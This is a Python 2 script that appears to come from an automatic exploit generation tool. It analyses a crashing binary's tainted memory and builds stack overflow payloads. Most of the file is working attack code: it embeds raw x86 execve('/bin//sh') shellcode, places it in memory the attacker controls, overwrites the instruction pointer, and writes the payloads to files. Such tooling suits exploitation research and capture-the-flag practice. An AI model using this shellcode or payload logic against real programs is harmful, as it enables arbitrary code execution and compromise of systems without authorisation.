#!/usr/bin/env python
# coding=utf-8

"""
Module      : solver.py 
Create By   : Bluecake
Description : A simple test for class Exploiter
"""

from emulator import *
import logging
from pwn import *

class exp_gen:

    def __init__(self, binary, crash):
        self.binary = binary
        self.crash = crash
        self.shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" #           // int    $0x80#'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
        self.controledMemory = list()

    def dealTaintedList(self,taintedData):
        taintedData.sort()
        start = taintedData[0]
        lastdata = taintedData[0]
        #nowdata = taintedData[0]
        size = 1
        for i in range(1,len(taintedData)):
            if taintedData[i] > lastdata+1:
                #size 
                self.controledMemory.append({'start':start,'size':size})
                start = taintedData[i]
                size = 1
            else:
                size += 1

            if i == (len(taintedData)-1):
                self.controledMemory.append({'start':start,'size':size})
            
            lastdata = taintedData[i]
        print self.controledMemory

    def findShellcodeAddr(self,src,len):
        for m in self.controledMemory:
            if ((src>=m['start']) &( src<=(m['start']+m['size']))):
                print hex(src + 4 + len ),hex(m['start']),hex(m['start']+m['size'])
                if (src + 4 + len)<= (m['start']+m['size']) :
                    return src +4
                if (src - len) >= m['start']:
                    return src - len
        for m in self.controledMemory:
            if m['size']>len:
                return  m['start']
        return 0

    def run(self):
        exp = Exploiter(self.binary, self.crash)
        if exp.getCrashType() == crash.CONTROL_PC:
            self.dealTaintedList(exp.taintedData)
            src = exp.getCrashMemory()
            target = self.shellcode
            print src
            shellcodeAddr = self.findShellcodeAddr(src,len(target))

            if shellcodeAddr == 0:
                print '[-] cannot find enough momery for shellcode'
                exit(0)
            print hex(src)
            print hex(shellcodeAddr)
            
            eip = range(src, src + 4)
            shellcode = range(shellcodeAddr,shellcodeAddr+len(target))
            exp.setdst(eip + shellcode)
            payload = exp.pcPayload(map(ord, p32(shellcodeAddr))+map(ord, target))
            with open('eip.in.stack', 'wb') as f:
                f.write(payload)
            
            print payload

        elif exp.getCrashType() == crash.SHELLCODE:
            target = self.shellcode
            src = exp.getCrashMemory()
            exp.setdst(range(src,src+len(target)))
            payload = exp.pcPayload(target)
            print payload
            with open('eip.in.bof', 'wb') as f:
                f.write(payload)
            print payload

        else:
            return False


if __name__ == '__main__':
    solver = exp_gen('./stack', './crash.in')
    solver.run()

